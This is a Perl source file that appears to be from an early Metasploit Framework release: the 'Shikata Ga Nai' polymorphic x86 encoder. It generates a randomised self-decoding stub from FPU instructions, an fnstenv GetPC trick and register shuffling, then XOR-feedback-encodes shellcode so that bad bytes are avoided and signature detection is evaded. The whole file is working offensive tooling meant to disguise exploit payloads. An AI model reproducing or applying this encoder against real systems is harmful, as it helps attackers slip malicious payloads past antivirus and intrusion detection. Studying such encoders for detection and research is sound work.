package Msf::Encoder::ShikataGaNai;

use strict;
use base 'Msf::Encoder';
use Pex::Encoder;
use Pex::Poly::BlockMaster;
use Pex::Poly::DeltaKing;
use Pex::Poly::RegAssassin;

my $bmb = 'Pex::Poly::BlockMaster::Block';
my $bm = 'Pex::Poly:BlockMaster';

my $advanced = {
  'DebugEnd' => [0, 'Don\'t encode the last 4 bytes.  The encoded payload won\'t be functional.'],
};

my $info = {
  'Name'    => 'Shikata Ga Nai',
  'Version' => '$Revision$',
  'Authors' => [ 'spoonm <ninjatools [at] hush.com> [Artistic License]', ],
  'Arch'    => [ 'x86' ],
  'OS'      => [ ],
  'Description'  =>  "You know what I'm saying, baby",
  'Refs'    => [ ],
};

sub new {
  my $class = shift;
  return($class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_));
}

sub EncodePayload {
  my $self = shift;
  return($self->_EncodeNormal(@_)) if(!$self->GetLocal('DebugEnd'));
  return($self->_EncodeSelfEnd(@_));
}
sub _BuildDelta {
  my $self = shift;
  my $rawshell = shift;
  my $badChars = shift;
  my $bm = $self->_BuildBM(length($rawshell));
  my $decoder = $bm->Build;
#  print STDERR $decoder;
  my $assassin = Pex::Poly::RegAssassin->new;
  $assassin->AddData($decoder);
  # no ecx, ebp, or esp
  $assassin->AddSet(['KEYREG', 'ADDRREG'], [0, 2, 3, 6, 7]);
  $decoder = $assassin->Build;
  my $delta = Pex::Poly::DeltaKing->new;
  $delta->AddData($decoder);
  return($delta);
}

sub _EncodeSelfEnd {
  my $self = shift;
  my $rawshell = shift;
  my $badChars = shift;

  my $decoder = $self->_BuildDelta($rawshell, $badChars)->Build;

  my $end = substr($decoder, -4, 4, '');
  $rawshell = $end . $rawshell;

  my $xorkey = Pex::Encoder::KeyScanXorDwordFeedback($rawshell, $badChars);
  if(!$xorkey) {
    $self->PrintDebugLine(3, 'Failed to find xor key');
    return;
  }

  my $xordat = Pex::Encoder::XorDwordFeedback($xorkey, $rawshell);

  $xorkey = pack('V', $xorkey);
  $decoder =~ s/XORK/$xorkey/s;

  my $shellcode = $decoder . $xordat;

  my $pos = Pex::Text::BadCharIndex($badChars, $shellcode);
  if($pos != -1) {
    print Pex::Text::BufferC($shellcode);
    $self->PrintDebugLine(3, 'Bad char at pos ' . $pos);
    $self->PrintDebugLine(3, sprintf('Bad byte %i', ord(substr($shellcode, $pos, 1))));
    return;
  }

  return($shellcode);
}

sub _EncodeNormal {
  my $self = shift;
  my $rawshell = shift;
  my $badChars = shift;

  my $decoder = $self->_BuildDelta($rawshell, $badChars)->Build;

  my $xorkey = Pex::Encoder::KeyScanXorDwordFeedback($rawshell, $badChars);
  if(!$xorkey) {
    $self->PrintDebugLine(3, 'Failed to find xor key');
    return;
  }

  my $xordat = Pex::Encoder::XorDwordFeedback($xorkey, $rawshell);

  $xorkey = pack('V', $xorkey);
  $decoder =~ s/XORK/$xorkey/s;

  my $shellcode = $decoder . $xordat;

  my $pos = Pex::Text::BadCharIndex($badChars, $shellcode);
  if($pos != -1) {
    print Pex::Text::BufferC($shellcode);
    $self->PrintDebugLine(3, 'Bad char at pos ' . $pos);
    $self->PrintDebugLine(3, sprintf('Bad byte %i', ord(substr($shellcode, $pos, 1))));
    return;
  }

  return($shellcode);
}

  # spoon's variable length dword xor add feedback whoozle codez
sub _BuildBM {
  my $self = shift;
  my $len = shift;
  $len += 4;
  my $l = Pex::Encoder::PackLength($len);

  my $fpuins = $bmb->new('fpuIns');

  foreach my $fpu ($self->_BuildFPUs) {
    $fpuins->AddBlock('[>0 fpu<]' . $fpu);
  }

  my $fnstenv = $bmb->new('fnstenv', "\xd9\x74\x24\xf4"); # fnstenv [esp - 12]
  my $pop = $bmb->new('popEbx', '[>1  chr(0x58 + ||ADDRREG||)<]'); # pop ebx

  # if I ever decide to give up a byte and move to jns
  my $zeroReg = '[>1 chr(0xc9)<]';
  my $zero = $bmb->new('clearEcx',
    "\x31" . $zeroReg, # xor ecx, ecx
    "\x29" . $zeroReg, # sub ecx, ecx
    # xvr rockin the hizzy
    "\x33" . $zeroReg, # xor ecx, ecx
    "\x2b" . $zeroReg, # sub ecx, ecx
  );

  my $mov = $bmb->new('movXorlen');
  if($l->{'padLength'} <= 255) {
    $mov->AddBlock("\xb1" . $l->{'lengthByte'}); # mov cl, BYTE xorlen
  }
  else {
    $mov->AddBlock("\x66\xb9" . $l->{'lengthWord'}); # mov cx, WORD xorlen
  }

  my $movkey = $bmb->new('movXorkey', '[>1 chr(0xb8 + ||KEYREG||)<]' . 'XORK'); # mov eax, xorkey
  my $loopXor = $bmb->new('loopBlock');

  # xor [ebx+dist], eax
  my $xor = "\x31" . '[>1 chr(0x40 + ||ADDRREG|| + (8 * ||KEYREG||))<]';
  my $xor1 = $xor . '[>1 chr(:end: - :fpu: - 4)<]';
  my $xor2 = $xor . '[>1 chr(:end: - :fpu: - 8)<]';
  my $add = "\x03" . '[>1 chr(0x40 + ||ADDRREG|| + (8 * ||KEYREG||))<]';
  my $add1 = $add . '[>1 chr(:end: - :fpu: - 4)<]';
  my $add2 = $add . '[>1 chr(:end: - :fpu: - 8)<]';
  my $sub4 = "\x83" . '[>1 chr(0xe8 + ||ADDRREG||)<]' . "\xfc";  # sub ebx, -4
  my $add4 = "\x83" . '[>1 chr(0xc0 + ||ADDRREG||)<]' . "\x04";  # add ebx, 4
  $loopXor->AddBlock(
    $xor1 . $add1 . $sub4,
    $xor1 . $sub4 . $add2,
    $sub4 . $xor2 . $add2,

    $xor1 . $add1 . $add4,
    $xor1 . $add4 . $add2,
    $add4 . $xor2 . $add2,
  );

  my $loop = $bmb->new('loopIns', "\xe2\xf5[>0 end<]");# loop xor_xor
      
  $fnstenv->AddDepend($fpuins);
  $pop->AddDepend($fnstenv);
  $mov->AddDepend($zero);
  $loopXor->AddDepend($pop, $mov, $movkey);
  $loop->AddDepend($loopXor);
      
  my $block = Pex::Poly::BlockMaster->new($fpuins, $zero, $movkey);
  return($block);
}

sub _BuildFPUs {
  my $self = shift;
  my @fpus;

  # load constants
  for(my $b = 0xe8; $b <= 0xee; $b++) {
    push(@fpus, "\xd9" . chr($b));
  }
  # fxch
  for(my $b = 0xc8; $b <= 0xcf; $b++) {
    push(@fpus, "\xd9" . chr($b));
  }

  # fnop
  push(@fpus, "\xd9\xd0");
  # fabs
  push(@fpus, "\xd9\xe1");
  # fchs
  push(@fpus, "\xd9\xe1");
  # fchs
  push(@fpus, "\xdb\xe1");
  # conditional movez
  for(my $b = 0xc0; $b <= 0xdf; $b++) {
    push(@fpus, "\xda" . chr($b));
    push(@fpus, "\xdb" . chr($b));
  }
  # fdecstp
  push(@fpus, "\xd9\xf6");
  # fincstp
  push(@fpus, "\xd9\xf7");
  # ffree
  for(my $b = 0xc0; $b <= 0xc7; $b++) {
    push(@fpus, "\xdd" . chr($b));
  }
  # fninit
  push(@fpus, "\xdb\xe3");

  # fld st(i)
  for(my $b = 0xc0; $b <= 0xc7; $b++) {
    push(@fpus, "\xd9" . chr($b));
  }

  # fxam
  push(@fpus, "\xd9\xe5");

  return(@fpus);
}

# This is a *really* bad method of doing this, temporary
sub _OutcomeTest {
  use Digest::MD5;
  my $class = shift;
  my $times = shift;
  my $outcomes = { };
  my $bm = $class->_BuildBM(0, 0);
  for(my $i = 0; $i < $times; $i++) {
    my $decoder = $bm->Build;
    my $assassin = Pex::Poly::RegAssassin->new;
    $assassin->AddData($decoder);
    # no ecx, ebp, or esp
    $assassin->AddSet(['KEYREG', 'ADDRREG'], [0, 2, 3, 6, 7]);
    $decoder = $assassin->Build;

    my $delta = Pex::Poly::DeltaKing->new;
    $delta->AddData($decoder);
    my $decoder = $delta->Build;

    $outcomes->{Digest::MD5::md5($decoder)}++;
  }
  return(scalar(keys(%{$outcomes})));
}
